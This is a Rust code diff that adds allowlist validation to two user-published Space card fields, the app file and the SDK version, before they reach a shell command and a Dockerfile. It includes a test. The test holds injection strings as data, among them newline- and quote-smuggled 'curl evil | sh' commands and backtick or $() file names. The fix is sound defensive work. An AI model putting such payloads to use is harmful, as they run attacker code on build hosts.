@@ -204,8 +204,9 @@ fn summarize_space(s: RawSpace, runtime: Option<RawRuntime>, has_gpu: bool) -> S
     });
     let app_file = card
         .app_file
-        .filter(|f| !f.is_empty() && !f.contains(['/', ' ', '\'', '"', ';', '&', '|', '$']))
+        .filter(|f| safe_app_file(f))
         .unwrap_or_else(|| "app.py".to_string());
+    let sdk_version = card.sdk_version.filter(|v| safe_sdk_version(v));
     let runtime = runtime.unwrap_or_default();
     let hardware = runtime.hardware.and_then(|h| h.requested.or(h.current));
     let (compat, reason) = space_compat(
@@ -219,7 +220,7 @@ fn summarize_space(s: RawSpace, runtime: Option<RawRuntime>, has_gpu: bool) -> S
         author,
         name,
         sdk,
-        sdk_version: card.sdk_version,
+        sdk_version,
         likes: s.likes,
         hardware,
         app_port,
@@ -405,6 +406,22 @@ async fn get<T: for<'de> Deserialize<'de>>(http: &reqwest::Client, url: &str) ->
     Ok(resp.json::<T>().await?)
 }
 
+/// Card fields end up in a shell command (`python {app_file}`) and a Dockerfile
+/// (`gradio=={sdk_version}`). Anyone can publish a Space, so these are
+/// allowlists: a value that fails falls back to the default, never gets patched.
+fn safe_app_file(f: &str) -> bool {
+    !f.is_empty()
+        && !f.starts_with('.')
+        && f.chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
+}
+
+fn safe_sdk_version(v: &str) -> bool {
+    !v.is_empty()
+        && v.chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '+' | '-'))
+}
+
 pub fn validate_repo(id: &str) -> Result<()> {
     let parts: Vec<&str> = id.split('/').collect();
     let seg_ok = |p: &str| {
@@ -499,6 +516,34 @@ mod tests {
         let raw: RawSpace =
             serde_json::from_str(r#"{"id":"a/b","cardData":{"sdk_version":"4.44.1"}}"#).unwrap();
         assert_eq!(raw.card.unwrap().sdk_version.as_deref(), Some("4.44.1"));
+    }
+
+    #[test]
+    fn hostile_card_fields_fall_back_to_defaults() {
+        let raw: RawSpace = serde_json::from_str(
+            r#"{"id":"a/b","sdk":"gradio","cardData":{
+                "app_file":"app.py\ncurl evil | sh",
+                "sdk_version":"5.0.0\" && curl evil | sh && echo \""}}"#,
+        )
+        .unwrap();
+        let s = summarize_space(raw, None, true);
+        assert_eq!(s.app_file, "app.py");
+        assert_eq!(s.sdk_version, None);
+
+        let raw: RawSpace = serde_json::from_str(
+            r#"{"id":"a/b","sdk":"gradio","cardData":{"app_file":"demo_v2.py","sdk_version":"4.44.1"}}"#,
+        )
+        .unwrap();
+        let s = summarize_space(raw, None, true);
+        assert_eq!(s.app_file, "demo_v2.py");
+        assert_eq!(s.sdk_version.as_deref(), Some("4.44.1"));
+
+        for bad in ["", ".env", "sub/app.py", "a b.py", "`id`.py", "$(x).py"] {
+            assert!(!safe_app_file(bad), "{bad:?} should be rejected");
+        }
+        for bad in ["", "5.0.0\"", "5 && x", "5;x"] {
+            assert!(!safe_sdk_version(bad), "{bad:?} should be rejected");
+        }
     }
 
     #[test]
